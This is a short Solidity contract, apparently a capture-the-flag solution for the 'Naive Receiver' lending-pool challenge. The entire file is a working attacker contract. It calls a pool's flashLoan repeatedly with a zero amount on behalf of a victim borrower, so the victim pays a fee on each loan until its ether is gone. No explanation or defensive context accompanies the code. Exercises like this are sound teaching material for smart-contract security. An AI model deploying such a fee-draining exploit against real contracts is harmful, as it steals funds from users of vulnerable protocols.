pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
  function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
  function attack(address receiver, address borrower) external {
    for (uint256 balance = borrower.balance; balance >= 1 ether; balance -= 1 ether) {
      INaiveReceiverLenderPool(receiver).flashLoan(borrower, 0);
    }
  }
}
